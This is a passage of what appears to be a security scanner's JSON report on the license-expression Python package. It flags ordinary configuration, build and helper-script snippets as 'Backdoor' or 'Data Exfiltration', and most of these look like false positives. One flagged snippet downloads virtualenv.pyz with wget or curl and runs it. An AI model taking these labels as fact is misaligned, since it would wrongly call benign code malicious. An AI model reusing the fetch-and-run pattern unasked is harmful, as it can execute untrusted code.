                      "markdown": "`# Defaults. Change these variables to customize this script\n################################\n\n# Requirement arguments passed to pip and used by default or with --dev.\nREQUIREMENTS=\"--editable . --constraint requirements.txt\"\nDEV_REQUIREMENTS=\"--editable .[testing] --constraint requirements.txt --constraint requirements-dev.txt\"\nDOCS_REQUIREMENTS=\"--editable .[docs] --constraint requirements.txt\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 52,
                  "endLine": 28,
                  "snippet": {
                    "text": "CLI_ARGS=$1\n\n################################\n# Defaults. Change these variables to customize this script\n################################\n\n# Requirement arguments passed to pip and used by default or with --dev.\nREQUIREMENTS=\"--editable . --constraint requirements.txt\"\n",
                    "rendered": {
                      "text": "CLI_ARGS=$1\n\n################################\n# Defaults. Change these variables to customize this script\n################################\n\n# Requirement arguments passed to pip and used by default or with --dev.\nREQUIREMENTS=\"--editable . --constraint requirements.txt\"\n",
                      "markdown": "`CLI_ARGS=$1\n\n################################\n# Defaults. Change these variables to customize this script\n################################\n\n# Requirement arguments passed to pip and used by default or with --dev.\nREQUIREMENTS=\"--editable . --constraint requirements.txt\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 6,
                  "endLine": 21,
                  "endColumn": 14,
                  "snippet": {
                    "text": "#\n# NOTE: please keep in sync with Windows script configure.bat\n#\n# This script will search for a virtualenv.pyz app in etc/thirdparty/virtualenv.pyz\n# Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\n################################\nCLI_ARGS=$1\n",
                    "rendered": {
                      "text": "#\n# NOTE: please keep in sync with Windows script configure.bat\n#\n# This script will search for a virtualenv.pyz app in etc/thirdparty/virtualenv.pyz\n# Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\n################################\nCLI_ARGS=$1\n",
                      "markdown": "`#\n# NOTE: please keep in sync with Windows script configure.bat\n#\n# This script will search for a virtualenv.pyz app in etc/thirdparty/virtualenv.pyz\n# Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\n################################\nCLI_ARGS=$1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 40,
                  "endLine": 19,
                  "endColumn": 48,
                  "snippet": {
                    "text": "# Source this script for initial configuration\n# Use configure --help for details\n#\n# NOTE: please keep in sync with Windows script configure.bat\n#\n# This script will search for a virtualenv.pyz app in etc/thirdparty/virtualenv.pyz\n# Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\n",
                    "rendered": {
                      "text": "# Source this script for initial configuration\n# Use configure --help for details\n#\n# NOTE: please keep in sync with Windows script configure.bat\n#\n# This script will search for a virtualenv.pyz app in etc/thirdparty/virtualenv.pyz\n# Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\n",
                      "markdown": "`# Source this script for initial configuration\n# Use configure --help for details\n#\n# NOTE: please keep in sync with Windows script configure.bat\n#\n# This script will search for a virtualenv.pyz app in etc/thirdparty/virtualenv.pyz\n# Otherwise it will download the latest from the VIRTUALENV_PYZ_URL default\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 13,
                  "endLine": 16,
                  "endColumn": 21,
                  "snippet": {
                    "text": "################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n#\n# NOTE: please keep in sync with Windows script configure.bat\n",
                    "rendered": {
                      "text": "################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n#\n# NOTE: please keep in sync with Windows script configure.bat\n",
                      "markdown": "`################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n#\n# NOTE: please keep in sync with Windows script configure.bat\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 17,
                  "endLine": 14,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#set -x\n\n################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n",
                    "rendered": {
                      "text": "#set -x\n\n################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n",
                      "markdown": "`#set -x\n\n################################\n# A configuration script to set things up:\n# create a virtualenv and install or update thirdparty packages.\n# Source this script for initial configuration\n# Use configure --help for details\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n#\n# Copyright (c) nexB Inc. and others. All rights reserved.\n# SPDX-License-Identifier: Apache-2.0\n# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n#\n# Copyright (c) nexB Inc. and others. All rights reserved.\n# SPDX-License-Identifier: Apache-2.0\n# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.\n",
                      "markdown": "`#!/usr/bin/env bash\n#\n# Copyright (c) nexB Inc. and others. All rights reserved.\n# SPDX-License-Identifier: Apache-2.0\n# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/configure"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 29,
                  "endLine": 110,
                  "endColumn": 79,
                  "snippet": {
                    "text": "            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n",
                    "rendered": {
                      "text": "            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n",
                      "markdown": "`            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/etc/thirdparty/virtualenv.pyz\"\n        else\n            VIRTUALENV_PYZ=\"$CFG_ROOT_DIR/$VENV_DIR/virtualenv.pyz\"\n            wget -O \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\" 2>/dev/null || curl -o  \"$VIRTUALENV_PYZ\" \"$VIRTUALENV_PYZ_URL\"\n        fi\n\n        $PYTHON_EXECUTABLE \"$VIRTUALENV_PYZ\" \\\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/pyproject.toml"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 47,
                  "endLine": 7,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n[tool.setuptools_scm]\n# this is used populated when creating a git archive\n# and when there is .git dir and/or there is no git installed\nfallback_version = \"9999.$Format:%h-%cs$\"\n\n[tool.pytest.ini_options]\n",
                    "rendered": {
                      "text": "\n[tool.setuptools_scm]\n# this is used populated when creating a git archive\n# and when there is .git dir and/or there is no git installed\nfallback_version = \"9999.$Format:%h-%cs$\"\n\n[tool.pytest.ini_options]\n",
                      "markdown": "`\n[tool.setuptools_scm]\n# this is used populated when creating a git archive\n# and when there is .git dir and/or there is no git installed\nfallback_version = \"9999.$Format:%h-%cs$\"\n\n[tool.pytest.ini_options]\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/pyproject.toml"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 40,
                  "endLine": 6,
                  "endColumn": 45,
                  "snippet": {
                    "text": "build-backend = \"setuptools.build_meta\"\n\n[tool.setuptools_scm]\n# this is used populated when creating a git archive\n# and when there is .git dir and/or there is no git installed\nfallback_version = \"9999.$Format:%h-%cs$\"\n\n",
                    "rendered": {
                      "text": "build-backend = \"setuptools.build_meta\"\n\n[tool.setuptools_scm]\n# this is used populated when creating a git archive\n# and when there is .git dir and/or there is no git installed\nfallback_version = \"9999.$Format:%h-%cs$\"\n\n",
                      "markdown": "`build-backend = \"setuptools.build_meta\"\n\n[tool.setuptools_scm]\n# this is used populated when creating a git archive\n# and when there is .git dir and/or there is no git installed\nfallback_version = \"9999.$Format:%h-%cs$\"\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.readthedocs.yml"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 13,
                  "endLine": 27,
                  "snippet": {
                    "text": "# Setting the python version and doc build requirements\npython:\n  install:\n    - method: pip\n      path: .\n      extra_requirements:\n        - docs\n",
                    "rendered": {
                      "text": "# Setting the python version and doc build requirements\npython:\n  install:\n    - method: pip\n      path: .\n      extra_requirements:\n        - docs\n",
                      "markdown": "`# Setting the python version and doc build requirements\npython:\n  install:\n    - method: pip\n      path: .\n      extra_requirements:\n        - docs\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.gitattributes"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 12,
                  "endLine": 1,
                  "endColumn": 17,
                  "snippet": {
                    "text": "# Ignore all Git auto CR/LF line endings conversions\n* -text\npyproject.toml export-subst\n",
                    "rendered": {
                      "text": "# Ignore all Git auto CR/LF line endings conversions\n* -text\npyproject.toml export-subst\n",
                      "markdown": "`# Ignore all Git auto CR/LF line endings conversions\n* -text\npyproject.toml export-subst\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/docs/scripts/doc8_style_check.sh"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 6,
                  "endLine": 2,
                  "endColumn": 14,
                  "snippet": {
                    "text": "#!/bin/bash\n# halt script on error\nset -e\n# Check for Style Code Violations\ndoc8 --max-line-length 100 source --ignore D000 --quiet",
                    "rendered": {
                      "text": "#!/bin/bash\n# halt script on error\nset -e\n# Check for Style Code Violations\ndoc8 --max-line-length 100 source --ignore D000 --quiet",
                      "markdown": "`#!/bin/bash\n# halt script on error\nset -e\n# Check for Style Code Violations\ndoc8 --max-line-length 100 source --ignore D000 --quiet`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/docs/scripts/sphinx_build_link_check.sh"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 6,
                  "endLine": 2,
                  "endColumn": 14,
                  "snippet": {
                    "text": "#!/bin/bash\n# halt script on error\nset -e\n# Build locally, and then check links\nsphinx-build -E -W -b linkcheck source build",
                    "rendered": {
                      "text": "#!/bin/bash\n# halt script on error\nset -e\n# Build locally, and then check links\nsphinx-build -E -W -b linkcheck source build",
                      "markdown": "`#!/bin/bash\n# halt script on error\nset -e\n# Build locally, and then check links\nsphinx-build -E -W -b linkcheck source build`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/fetch_thirdparty.py"
                },
                "region": {
                  "startLine": 169,
                  "startColumn": 9,
                  "endLine": 169,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n    Download the PyPI packages listed in the combination of:\n    - the pip requirements --requirements REQUIREMENT-FILE(s),\n    - the pip name==version --specifier SPECIFIER(s)\n    - any pre-existing wheels or sdsists found in --dest-dir THIRDPARTY_DIR.\n\n    Download wheels with the --wheels option for the ``--python-version``\n",
                    "rendered": {
                      "text": "\n    Download the PyPI packages listed in the combination of:\n    - the pip requirements --requirements REQUIREMENT-FILE(s),\n    - the pip name==version --specifier SPECIFIER(s)\n    - any pre-existing wheels or sdsists found in --dest-dir THIRDPARTY_DIR.\n\n    Download wheels with the --wheels option for the ``--python-version``\n",
                      "markdown": "`\n    Download the PyPI packages listed in the combination of:\n    - the pip requirements --requirements REQUIREMENT-FILE(s),\n    - the pip name==version --specifier SPECIFIER(s)\n    - any pre-existing wheels or sdsists found in --dest-dir THIRDPARTY_DIR.\n\n    Download wheels with the --wheels option for the ``--python-version``\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/fetch_thirdparty.py"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 9,
                  "endLine": 168,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    and their ABOUT metadata, license and notices files.\n\n    Download the PyPI packages listed in the combination of:\n    - the pip requirements --requirements REQUIREMENT-FILE(s),\n    - the pip name==version --specifier SPECIFIER(s)\n    - any pre-existing wheels or sdsists found in --dest-dir THIRDPARTY_DIR.\n\n",
                    "rendered": {
                      "text": "    and their ABOUT metadata, license and notices files.\n\n    Download the PyPI packages listed in the combination of:\n    - the pip requirements --requirements REQUIREMENT-FILE(s),\n    - the pip name==version --specifier SPECIFIER(s)\n    - any pre-existing wheels or sdsists found in --dest-dir THIRDPARTY_DIR.\n\n",
                      "markdown": "`    and their ABOUT metadata, license and notices files.\n\n    Download the PyPI packages listed in the combination of:\n    - the pip requirements --requirements REQUIREMENT-FILE(s),\n    - the pip name==version --specifier SPECIFIER(s)\n    - any pre-existing wheels or sdsists found in --dest-dir THIRDPARTY_DIR.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/fetch_thirdparty.py"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 17,
                  "endLine": 35,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    metavar=\"REQUIREMENT-FILE\",\n    multiple=True,\n    required=False,\n    help=\"Path to pip requirements file(s) listing thirdparty packages.\",\n)\n@click.option(\n    \"--spec\",\n",
                    "rendered": {
                      "text": "    metavar=\"REQUIREMENT-FILE\",\n    multiple=True,\n    required=False,\n    help=\"Path to pip requirements file(s) listing thirdparty packages.\",\n)\n@click.option(\n    \"--spec\",\n",
                      "markdown": "`    metavar=\"REQUIREMENT-FILE\",\n    multiple=True,\n    required=False,\n    help=\"Path to pip requirements file(s) listing thirdparty packages.\",\n)\n@click.option(\n    \"--spec\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/fetch_thirdparty.py"
                },
                "region": {
                  "startLine": 233,
                  "startColumn": 61,
                  "endLine": 233,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    repos = []\n    for index_url in index_urls:\n        index_url = index_url.strip(\"/\")\n        existing = utils_thirdparty.DEFAULT_PYPI_REPOS_BY_URL.get(index_url)\n        if existing:\n            existing.use_cached_index = use_cached_index\n            repos.append(existing)\n",
                    "rendered": {
                      "text": "    repos = []\n    for index_url in index_urls:\n        index_url = index_url.strip(\"/\")\n        existing = utils_thirdparty.DEFAULT_PYPI_REPOS_BY_URL.get(index_url)\n        if existing:\n            existing.use_cached_index = use_cached_index\n            repos.append(existing)\n",
                      "markdown": "`    repos = []\n    for index_url in index_urls:\n        index_url = index_url.strip(\"/\")\n        existing = utils_thirdparty.DEFAULT_PYPI_REPOS_BY_URL.get(index_url)\n        if existing:\n            existing.use_cached_index = use_cached_index\n            repos.append(existing)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_requirements_dev.py"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 50,
                  "endLine": 47,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        type=pathlib.Path,\n        metavar=\"FILE\",\n        default=\"requirements-dev.txt\",\n        help=\"Path to the dev requirements file to update or create.\",\n    )\n    parser.add_argument(\n        \"-r\",\n",
                    "rendered": {
                      "text": "        type=pathlib.Path,\n        metavar=\"FILE\",\n        default=\"requirements-dev.txt\",\n        help=\"Path to the dev requirements file to update or create.\",\n    )\n    parser.add_argument(\n        \"-r\",\n",
                      "markdown": "`        type=pathlib.Path,\n        metavar=\"FILE\",\n        default=\"requirements-dev.txt\",\n        help=\"Path to the dev requirements file to update or create.\",\n    )\n    parser.add_argument(\n        \"-r\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_requirements_dev.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 61,
                  "endLine": 27,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    description = \"\"\"\n    Create or overwrite the `--dev-requirements-file` pip requirements FILE with\n    all Python packages found installed in `--site-packages-dir`. Exclude\n    package names also listed in the --main-requirements-file pip requirements\n    FILE (that are assume to the production requirements and therefore to always\n    be present in addition to the development requirements).\n    \"\"\"\n",
                    "rendered": {
                      "text": "    description = \"\"\"\n    Create or overwrite the `--dev-requirements-file` pip requirements FILE with\n    all Python packages found installed in `--site-packages-dir`. Exclude\n    package names also listed in the --main-requirements-file pip requirements\n    FILE (that are assume to the production requirements and therefore to always\n    be present in addition to the development requirements).\n    \"\"\"\n",
                      "markdown": "`    description = \"\"\"\n    Create or overwrite the `--dev-requirements-file` pip requirements FILE with\n    all Python packages found installed in `--site-packages-dir`. Exclude\n    package names also listed in the --main-requirements-file pip requirements\n    FILE (that are assume to the production requirements and therefore to always\n    be present in addition to the development requirements).\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_requirements_dev.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 53,
                  "endLine": 25,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\ndef gen_dev_requirements():\n    description = \"\"\"\n    Create or overwrite the `--dev-requirements-file` pip requirements FILE with\n    all Python packages found installed in `--site-packages-dir`. Exclude\n    package names also listed in the --main-requirements-file pip requirements\n    FILE (that are assume to the production requirements and therefore to always\n",
                    "rendered": {
                      "text": "\ndef gen_dev_requirements():\n    description = \"\"\"\n    Create or overwrite the `--dev-requirements-file` pip requirements FILE with\n    all Python packages found installed in `--site-packages-dir`. Exclude\n    package names also listed in the --main-requirements-file pip requirements\n    FILE (that are assume to the production requirements and therefore to always\n",
                      "markdown": "`\ndef gen_dev_requirements():\n    description = \"\"\"\n    Create or overwrite the `--dev-requirements-file` pip requirements FILE with\n    all Python packages found installed in `--site-packages-dir`. Exclude\n    package names also listed in the --main-requirements-file pip requirements\n    FILE (that are assume to the production requirements and therefore to always\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/test_utils_pypi_supported_tags.py"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 38,
                  "endLine": 4,
                  "snippet": {
                    "text": "# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 23,
                  "endLine": 11,
                  "snippet": {
                    "text": "    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n",
                    "rendered": {
                      "text": "    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n",
                      "markdown": "`    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 38,
                  "endLine": 16,
                  "snippet": {
                    "text": "            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n    test_suite_label: ''\n\n\n",
                    "rendered": {
                      "text": "            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n    test_suite_label: ''\n\n\n",
